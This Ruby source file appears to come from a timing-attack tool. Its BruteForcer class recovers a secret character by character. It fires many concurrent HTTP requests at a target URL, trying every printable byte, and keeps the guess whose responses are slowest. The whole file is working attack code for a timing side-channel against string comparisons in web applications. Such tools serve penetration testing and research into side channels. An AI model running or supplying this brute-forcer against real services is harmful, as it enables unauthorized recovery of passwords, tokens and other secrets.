module TimingAttack
  class BruteForcer
    include TimingAttack::Attacker

    def initialize(options: {})
      @options = DEFAULT_OPTIONS.merge(options)
      raise ArgumentError.new("Must provide :url key") if url.nil?
      @concurrency = options.fetch(:concurrency, 3)
      @iterations = options.fetch(:iterations, 20)
    end

    private

    BYTES = (' '..'z').to_a
    def attack!
      known = ""
      while(true)
        attacks = BYTES.map do |byte|
          TimingAttack::TestCase.new(input: "#{known}#{byte}",
                                      options: options)
        end
        hydra = Typhoeus::Hydra.new(max_concurrency: concurrency)
        iterations.times do
          attacks.each do |attack|
            req = attack.generate_hydra_request!
            req.on_complete do |response|
              print "\r#{' ' * (known.length + 4)}"
              output.increment
              print "'#{known}'"
            end
            hydra.queue req
          end
        end
        hydra.run
        attacks.each(&:process!)
        grouper = Grouper.new(attacks: attacks, group_by: { percentile: 3 })
        results = grouper.long_tests.map(&:input)
        if grouper.long_tests.count > 1
          raise StandardError.new("Got too many possibilities: #{results.join(', ')}")
        end
        known = results.first
      end
    end
  end

  def output
    @output ||= TimingAttack::Spinner.new
  end

  DEFAULT_OPTIONS = {
    verbose: true,
    method: :get,
    iterations: 50,
    mean: false,
    percentile: 3,
    concurrency: 15,
  }.freeze
end
